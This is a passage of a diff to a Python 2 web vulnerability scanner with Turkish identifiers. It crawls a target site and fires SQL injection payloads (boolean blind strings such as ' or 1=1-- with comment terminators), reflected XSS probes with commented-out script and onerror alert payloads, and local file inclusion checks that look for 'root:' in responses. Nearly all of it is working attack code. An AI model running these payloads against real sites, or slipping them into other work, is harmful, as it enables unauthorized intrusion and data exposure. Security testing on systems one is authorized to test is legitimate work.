 		    print "POST SQL testi yapiliyor"
 		    f = urllib2.urlopen(url, parametre)
-		sqlkontrol (f.read(),url+" [POST Sayfasi]")
+		sqlkontrol (temizle(f.read()),"[#] SQL ERROR BULUNDU \n LINK = "+url+"\n Veri= "+parametre)
 		postgetdict.clear()
 		postgetdict=params.copy()		
 		
@@ -382,7 +664,7 @@ def postget(url, params, method):
 	    yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
 	
     except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
 		#yaz(mesaj)
     except:
 	mesaj="Bilinmeyen hata olustu\n"
@@ -391,23 +673,54 @@ def postget(url, params, method):
 
 
 def comparePages(page1,page2,deurl,info):
+
+    #bakalim1=set(list(page1.split("\n")))
+    #bakalim2=set(list(page2.split("\n")))
+    
+    #toplamsatir=""
+    
+    #varrr=False
+    #for satir1 in bakalim1:
+	#for satir2 in bakalim2:
+	    #if satir1!=satir2:
+		#varrr=True
+		##mesaj1="Link %s  \n" % (deurl)
+		#mesaj2=info+"\n"
+		##mesaj3="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar var\n"
+		#toplamsatir+=satir1+"\n"
+		
+    #if varrr==True:
+	#print "Gerekli bilgi log dosyasina yazildi\n"
+	#yaz(mesaj2+"\n",True)
+	#varrr=False
+	#toplamsatir=""
+	
+		
     tmp1 = re.split("<[^>]+>",page1)
     tmp2 = re.split("<[^>]+>",page2) 
     count1 = 0;
     count2 = 0;
     
+    
+    
     for i in range(len(tmp1)):
 	if page2.find(tmp1[i]) < 0:
+	    
 	    mesaj="Link %s  \n" % (deurl)
-	    mesaj+=info
-	    mesaj+="[#] Anormal Durum Algilandi / Yakalanan Durum Satiri %s \n" % (tmp1[i])
+	    mesaj+=info+"\n"
+	    mesaj+="[#] Veri yollaninca sayfada degisen degerler var / Degisen Satirlar = %s \n" % (tmp1[i])
 	    yaz(mesaj+"\n",True)
 	    count1+=1
+	    ran=random.randrange(1, 100000, 2)
+	    Debugyaz("debug/"+str(ran)+"false.html",mesaj+"\n\n\n\n\n"+page2)
+	    Debugyaz("debug/"+str(ran)+"true.html",mesaj+"\n\n\n\n\n"+page1)
+    
+    
     
     for i in range(len(tmp2)):
 	if page1.find(tmp2[i]) < 0:
 	    count2+=1
-	    #print max(count1, count2)
+	    ##print max(count1, count2)
     return max(count1, count2)
 
 
@@ -479,6 +792,10 @@ def sqlkontrol(response,urlnormal):
     if re.search("Fatal Error.*at line",response,re.DOTALL):
 	mesaj= "[#] %s PHP error"%urlnormal
 	yaz(mesaj,True)
+	
+    if re.search("Warning: mysql_num_rows():",response,re.DOTALL):
+	mesaj= "[#] %s MYSQL ERROR "%urlnormal
+	yaz(mesaj,True)
 
 
 def xsstest(xsstesturl):
@@ -488,7 +805,7 @@ def xsstest(xsstesturl):
 	urlac = urllib2.urlopen(xsstesturl+"bekirburadaydi11111")
 	response = urlac.read()
 	if "bekirburadaydi11111" in response:
-	    yaz("XSS Test BULUNDU : " + xsstesturl+"bekirburadaydi11111",True)
+	    #yaz("XSS Test BULUNDU : " + xsstesturl+"bekirburadaydi11111",True)
 	    xsstara(xsstesturl)
 		  
     except urllib2.HTTPError,e:
@@ -503,13 +820,27 @@ def xsstest(xsstesturl):
 	
 
 def xsstara(xssurl):
+    
+    #xsspayload=["\"><script>alert(0x98101107105114981171149710097)</script>",
+                #"\"><sCriPt>alert(0x98101107105114981171149710097)</sCriPt>",
+                #"\"; alert(document.0x98101107105114981171149710097);",
+                #"\"></sCriPt><sCriPt >alert(0x98101107105114981171149710097)</sCriPt>",
+                #"\"><img Src=0x94 onerror=alert(0x98101107105114981171149710097)>",
+                #"\"><BODY ONLOAD=alert(0x98101107105114981171149710097)>",
+                #"\"><IMG SRC=\"javascript:alert(0x98101107105114981171149710097);\">",
+                #"\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x98101107105114981171149710097);\">"]
+    
     try:
 	print "XSS Taraniyor ... "
-	urlnormal=lfiurl.replace("=", "=bekirburadaydi11111")
+	urlnormal=xssurl.replace("=", "=\"><0x98101107105114981171149710097>")
 	urlac = urllib2.urlopen(urlnormal)
 	response = urlac.read()
-	if "bekirburadaydi11111" in response:
-	    yaz("[#] XSS BULUNDU : " + urlnormal,True)
+	if "\"><0x98101107105114981171149710097>" in response:
+	    xssmi=xsscalisiomu(response)
+	    if xssmi==False:
+		yaz("[#] XSS BULUNDU ve Satirda Noscript Yok: " + urlnormal,True)
+	    else:
+		yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
 		   
     except urllib2.HTTPError,  e:
 	if(e.code==500):
@@ -576,7 +907,7 @@ def lfitara(lfibul):
 	    print "LFi Taraniyor ... "
 	    urlnormal=lfiurl.replace("=", "="+lfidizin)
 	    urlac = urllib2.urlopen(urlnormal)
-	    response = urlac.read()
+	    response = temizle(urlac.read())
 	    if "root:" in response or "noexecute=optout" in response:
 		yaz("[#] LFI BULUNDU : " + urlnormal,True)
 	       
@@ -598,7 +929,7 @@ def lfitest(lfiurl):
 	print "LFI Test Yapiliyor ... "
 	urlnormal=lfiurl.replace("=", "=bekirburadaydi.txt")
 	urlac = urllib2.urlopen(urlnormal)
-	response = urlac.read()
+	response = temizle(urlac.read())
 	if "failed to open stream" in response:
 	    yaz("[#] LFI Testi BULUNDU : " + urlnormal,True)
 	    lfitara(lfiurl)
@@ -623,7 +954,7 @@ def sql(urlnormal):
 	print "SQL Test Taraniyor ... "
 	urlnormal=urlnormal.replace("=", "='")
 	urlac = urllib2.urlopen(urlnormal)
-	response = urlac.read()
+	response = temizle(urlac.read())
 	sqlkontrol(response,urlnormal)
 	
     except urllib2.HTTPError,  e:
@@ -640,69 +971,74 @@ def sql(urlnormal):
 
 def blind(urlblind):
     
-
+    html1=""
+    html2=""
     linknormal = urllib2.urlopen(urlblind)
     normalkaynak=linknormal.read()
 
-    print "Blind Taraniyor ... "
-    true_strings = [" and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1--"," group by 1"]           
-    false_strings =[" and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2--"," group by 99999"]
-    i = 0
-    while i < 7:    
-        blindtrue = urlblind + urlencode(parse_qsl(true_strings[i])) 
-	print "Denenen Blind : "+true_strings[i]
-        try:
-            req1 = urllib2.Request(blindtrue.replace("&",urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
-            req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
-            req1.add_header('Keep-Alive: ','115')
-            req1.add_header('Referer: ','http://'+urlblind)
-            response1 = urllib2.urlopen(req1)
-            html1 = response1.read()
-	    
-        except urllib2.HTTPError,e:
-            if(e.code==500):
-		yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error " +urlblind+true_strings[i],True)
-	except urllib2.URLError,e:
-	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
-	    #yaz(mesaj)
-	
-	except:
-	    mesaj="Bilinmeyen hata olustu\n"
-	    #yaz(mesaj)
-	    
-        blindfalse = urlblind + urlencode(parse_qsl(false_strings[i])) 
-	print "Denenen Blind:"+false_strings[i]
-	try:
-	    i=i+1
-            req2 = urllib2.Request(blindfalse.replace("&",urlencode(parse_qsl(false_strings[i])) +"&").replace(" ", "%20"))
-            req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
-            req2.add_header('Keep-Alive: ','115')
-            req2.add_header('Referer: ','http://'+urlblind)
-            response2 = urllib2.urlopen(req2)
-            html2 = response2.read() 
+    bitiskarakter=["","--","/*","--+",";",";--","--"]
+    true_strings = ["'or''='","' or 1=1--","bekir' AND 'a'='a","' OR 'bk'='bk","' and 1=(select 1)+'","' aNd 1=1"," and 1=1"," ' and 1=1"," and 'a'='a","' and 'a'='a","' and 'a'='a"," and 1 like 1"," and 1 like 1/*"," and 1=1"," group by 1","'+(SELECT 1)+'","' and 1=(select 1)+'","'+aNd+10>1"]           
+    false_strings =["'or''!!!='","' or 1=2--","bekir' AND 'a'='b","' OR 'bk'='bekir","' and 1=(select 999999)+'","' aNd 1=2"," and 1=2"," ' and 1=2"," and 'a'='b","' and 'a'='b","' and 'a'='b"," and 1 like 2"," and 1 like 2/*"," and 1=2"," group by 99999","'+(SELECT 99999)+'","' and 1=(select 2)+'","'+aNd+10>20"]	
+    for sonkarakter in bitiskarakter:
+	i=0
+	while i < 10:    
+	    print "Blind Taraniyor ... "+true_strings[i]+" "+sonkarakter
+	    blindtrue = urlblind + urllib.urlencode(parse_qsl(true_strings[i]+sonkarakter)) 
+	    try:
+		req1 = urllib2.Request(blindtrue.replace("&",urllib.urlencode(parse_qsl(true_strings[i])) +"&").replace(" ", "%20"))
+		req1.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
+		req1.add_header('Keep-Alive: ','115')
+		req1.add_header('Referer: ','http://'+urlblind)
+		response1 = urllib2.urlopen(req1)
+		response_headers = response1.info()
 		
-	except urllib2.HTTPError,e:
-            if(e.code==500):
-		yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error" +urlblind+false_strings[i],True)
-	except urllib2.URLError,e:
-	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
-	    #yaz(mesaj)
-	
-	except:
-	    mesaj="Bilinmeyen hata olustu\n"
-	    #yaz(mesaj)
-   
-	
-              
-	if (comparePages(html1,normalkaynak,response2.geturl()," BLIND ") > comparePages(html1,html2,linknormal.geturl()," BLIND ")):
-		    mesaj="[#] Blind ile Sayfada Degisiklik oldu %s " % urlblind+"\nVERi = "+false_strings[i]+"\n"
-		    yaz(mesaj,True)
- 
+		html1 = temizle(response1.read())
+		
+	    except urllib2.HTTPError,e:
+		if(e.code==500):
+		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error " +urlblind+true_strings[i]+sonkarakter,True)
+	    except urllib2.URLError,e:
+		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
+		#yaz(mesaj)
+	    
+	    except:
+		mesaj="Bilinmeyen hata olustu\n"
+		#yaz(mesaj)
+	    print "Blind Taraniyor ... "+false_strings[i]+" "+sonkarakter
+	    blindfalse = urlblind + urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) 
+	    try:
+		i=i+1
+		req2 = urllib2.Request(blindfalse.replace("&",urllib.urlencode(parse_qsl(false_strings[i]+sonkarakter)) +"&").replace(" ", "%20"))
+		req2.add_header('UserAgent: ','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)')
+		req2.add_header('Keep-Alive: ','115')
+		req2.add_header('Referer: ','http://'+urlblind)
+		response2 = urllib2.urlopen(req2)
+		html2 = temizle(response2.read()) 
+		    
+	    except urllib2.HTTPError,e:
+		if(e.code==500):
+		    yaz("[#] URL BLIND Http 500 Dondu  / Internal Server Error" +urlblind+false_strings[i]+sonkarakter,True)
+	    except urllib2.URLError,e:
+		mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlblind)
+		#yaz(mesaj)
+	    
+	    except:
+		mesaj="Bilinmeyen hata olustu\n"
+		#yaz(mesaj)
+       
+	    if normalkaynak==html1:  
+		if html1!=html2:
+		    comparePages(html1,html2,response2.geturl(),"[#] GET Blind ile Sayfada Degisiklik oldu %s " % urlblind+"\nVERi = "+false_strings[i]+sonkarakter+"\n")
+		    debug=1
+     
 
 
     
-class YeniOpener(urllib.FancyURLopener):   
-    version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'
+#class YeniOpener(urllib.FancyURLopener):   
+    #version = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15'
+
+
+
 
 def aynivarmi(keyurl):
     if aynilinkler.has_key(keyurl):
@@ -734,7 +1070,7 @@ def optionsheader(url):
 		yok=0
 	else:
 		  
-		print "[+] Sunucuda WebDav kurulu"
+	    print "[+] Sunucuda WebDav kurulu"
     except:
 	print "Allow Header alinirken hata oldu"
 
@@ -745,6 +1081,19 @@ def headerbilgi(host):
 	yaz("[#] Makina Bilgisi : "+host+" - "+str(urlac.info().getheader('Server')),True)
     except:
 	print "Header bilgisi alinamadi"
+	
+def xsscalisiomu(kaynak):
+    
+    bakalim=set(list(kaynak.split("\n")))
+    
+    for satir in bakalim:
+	if "\"><0x98101107105114981171149710097>" in satir:
+	    if "<code>" in satir or "<noscript>" in satir:
+		xssdurum=True
+	    else:
+		xssdurum=False
+		
+    return xssdurum
 
 def robots(host):
     try:
@@ -754,107 +1103,152 @@ def robots(host):
     except:
 	print "robots.txt kontrolu yapilamadi"
 
-def locationbypass(link):
-    try:
-	o = urlparse.urlparse(link,allow_fragments=True)
-	conn = httplib.HTTPConnection(o.netloc)
-	path = o.path
-	if o.query:
-		path +='?'+o.query   
-	conn.request("HEAD", path)
-	res = conn.getresponse()
-	headers = dict(res.getheaders())
-	if headers.has_key('location'):
-	    if "http" not in headers['location']:
-		print "Eski URL "+link
-		print "Yeni URL "+o.hostname+headers['location']
-		return "http://"+o.hostname+headers['location'].encode('utf-8').strip()
-	    else:
-		return headers['location'].encode('utf-8').strip()
+
+
+def ZiyaretSayisi(link):
+    
+    if "=" in link:
+	toplukey=""
+	dosya=link[:link.find("?")]
+	toplukey=dosya
+    
+	for key,value in urlparse.parse_qs(urlparse.urlparse(link).query, True).items():
+	    toplukey+=key
+	    
+	if limitlinkler.has_key(toplukey):
+	    durum=True
 	else:
-	    return link.encode('utf-8').strip() 
+	    limitlinkler[toplukey]=1
+	    durum=False
+    else:
+	
+	if limitlinkler.has_key(link):
+	    durum=True
+	else:
+	    limitlinkler[link]=1
+	    durum=False
+	
+    return durum
+
+def locationbypass(link):
+
+    try:
+	link=link.replace("amp;","&")
+	    
+	if "http" not in link:
+	    yeni= "http://"+link.encode('utf-8').strip()
+	else:
+	    yeni= link.encode('utf-8').strip() 
+	return yeni
     except:
 	print "Location Alinirken Hata oldu"
 
 
 class Anaislem(threading.Thread):
-    def __init__(self, queues,lock):
+    def __init__(self, gelensite,lock):
         threading.Thread.__init__(self)
-	self.queue = queue
+	self.gelensite = yedekq
 	self.lock  = lock
 	self.tamurl=""
 
     def run(self):
-	while not self.queue.empty():
+	while not self.gelensite.empty():
 	    try:
-		self.tamurl = self.queue.get()
+		sleep(reqbeklemesuresi)
+		self.tamurl = self.gelensite.get()
+		normalac(self.tamurl)
 		formyaz(self.tamurl)
 		headerinjection(self.tamurl)
-		if "javascript" not in self.tamurl:
-		    if "php?" in self.tamurl:
-			lfitest(self.tamurl)
-			
-		    if "?" in self.tamurl:
-			sql(self.tamurl)
-			timebased(self.tamurl)
-			blind(self.tamurl)
-			xsstest(self.tamurl)  
+		if "php?" in self.tamurl:
+		    lfitest(self.tamurl)
+		    y=2
+		if "?" in self.tamurl:
+		    y=1
+		    sql(self.tamurl)
+		    timebased(self.tamurl)
+		    blind(self.tamurl)
+		    xsstest(self.tamurl)
 	    except:
 		print "site adresi alinirken hata oldu"
-		self.queue.task_done()
+		self.gelensite.task_done()
 		continue
 		
+def temizle(source):
+    
+    yenisource=source.replace("<script","")
+    re.sub(r"\"(.*?)\"|'(.*?)'","",yenisource)
+    return yenisource
 
-
-def linkler(urltara):
+def linkler(urltara,host):
+    
     try:
-	dahildegil = ("ico","css","mailto:","tel:","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
 	
-	linkopener = YeniOpener()
-	linkopener.addheaders = [
-	    ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
-	    ("Cookie", sayfacookie)]
-	
-	page = linkopener.open(urltara)
-	host=urlparse.urlparse(urltara).hostname
-	text = page.read()
-	page.close()
-	soup = BeautifulSoup(text)
-	
-	for ee in re.findall('''href=["'](.[^"']+)["']''', text, re.I):
-	    if "tel:+" not in ee or "mailto:" not in ee:
-		if ee.split('.')[-1].lower() not in dahildegil:	    
-		    birlesik=urlparse.urljoin(urltara, ee).replace("#","")
-		    if aynivarmi(birlesik)==False:
-			queue.put(birlesik)
-			aynilinkler[birlesik]="bekir"
+	queue.put(urltara)
+	yedekq.put(urltara)
+	print "Saglikli tarama icin sitedeki tum linkleri cekiyor lutfen bekleyiniz..."
+	while not queue.empty():
+	    qudekiveri=queue.get()
+	    dahildegil = ("html","html","js","xml","ico","css","gif","jpg","jar","tif","bmp","war","ear","mpg","wmv","mpeg","scm","iso","dmp","dll","cab","so","avi","bin","exe","iso","tar","png","pdf","ps","mp3","zip","rar","gz")
 	    
-	
-	for tag in soup.findAll('a',href=True):
-	    tag['href'] = urlparse.urljoin(urltara, tag['href'])
-	    asilurl=tag['href'].encode('utf-8').strip()
-	    tamurl=asilurl
-	    tamurl=locationbypass(asilurl)
-	    if aynivarmi(tamurl)==False:
-		if host in tamurl:
-		    queue.put(tamurl)
-		    aynilinkler[tamurl]="bekir"
-		    
-	threads = []
-	lock    = threading.Lock()
-	for i in range(5):
-	    t = Anaislem(queue,lock)
-	    t.setDaemon(True)
-	    threads.append(t)
-	    t.start()
-	   
-	while any([x.isAlive() for x in threads]):
-	    sleep(0.1)
-
-	
-
+	    linkopener = urllib2.build_opener(HTTPAYAR,urllib2.HTTPSHandler(),urllib2.HTTPCookieProcessor())
+	    linkopener.addheaders = [
+		    ('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
+		    ("Cookie", sayfacookie)]
+	    
+	    #linkopener = YeniOpener()
+	    #linkopener.addheaders = [
+		#('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13'),
+		#("Cookie", sayfacookie)]
+	    
+	    page = linkopener.open(qudekiveri)
+	    text = page.read()
+	    page.close()
+	    soup = BeautifulSoup(text)
+	    
+	    for ee in re.findall('''href=["'](.[^"']+)["']''', text, re.I):
+		if "javascript" not in ee.lower() or "mailto:" not in ee.lower() or "tel:+" not in ee.lower():
+		    if ee.split('.')[-1].lower() not in dahildegil:	    
+			birlesik=urlparse.urljoin(qudekiveri, ee).replace("#","")
+			if aynivarmi(birlesik)==False:
+			    if host in birlesik:
+				tamurl2=locationbypass(birlesik)
+				limiti=ZiyaretSayisi(tamurl2)
+				if limiti==False:
+				    print tamurl2
+				    queue.put(tamurl2)
+				    yedekq.put(tamurl2)
+				    aynilinkler[tamurl2]="bekir"
+	    
+	    
+	    for tag in soup.findAll('a',href=True):
+		if "javascript" not in tag['href'].lower() or  "mailto:" not in tag['href'].lower() or  "tel:+" not in tag['href'].lower():
+		    if tag['href'].split('.')[-1].lower() not in dahildegil:
+			tag['href'] = urlparse.urljoin(qudekiveri, tag['href'])
+			asilurl=tag['href'].encode('utf-8').strip()
+			if aynivarmi(asilurl)==False:
+			    if host in asilurl:
+				tamurl=locationbypass(asilurl)
+				limiti2=ZiyaretSayisi(tamurl)
+				if limiti2==False:
+				    print tamurl
+				    queue.put(tamurl)
+				    yedekq.put(tamurl)
+				    aynilinkler[tamurl]="bekir"
     except:
 	print "Linkleri alirken hata olustu"
+
+    print "Linkleri Alma bitti tarama basliyor..."
+    threads = []
+    lock    = threading.Lock()
+    for i in range(5):
+	t = Anaislem(yedekq,lock)
+	t.setDaemon(True)
+	threads.append(t)
+	t.start()
+       
+    while any([x.isAlive() for x in threads]):
+	sleep(0.1)
+
 
 def main():
     print "########################################"
@@ -874,9 +1268,11 @@ def main():
 	ooooo = maketrans(giris, cikis)
 	asd=url.translate(ooooo)
 	if "{}>" not in asd:
-	    headerbilgi(url)
-	    optionsheader(url)
-	    linkler(url)
+		headerbilgi(url)
+		optionsheader(url)
+		cx=urlparse.urlparse(url)
+		hostcx=cx.netloc.replace("www","")
+		linkler(url,hostcx)
 
 
 if __name__ == "__main__":
